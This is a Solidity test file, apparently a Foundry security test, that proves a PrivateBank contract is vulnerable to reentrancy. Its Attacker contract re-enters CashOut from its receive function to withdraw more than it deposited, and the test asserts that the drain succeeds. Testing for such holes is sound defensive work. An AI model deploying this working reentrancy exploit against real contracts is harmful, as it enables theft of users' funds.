
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank,Log} from "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {
    PrivateBank public _privateBank;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _privateBank = new PrivateBank(address(_log));
        _attacker = new Attacker(address(_privateBank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);
        vm.assume(attackVal <= address(this).balance);

        vm.deal(address(_privateBank), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = PrivateBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;

        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));
        attackAmount = val;

        victim.CashOut(val);

        if (victim.balances(address(this)) == 0 && address(this).balance > val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.CashOut(attackAmount);
        }
    }
}
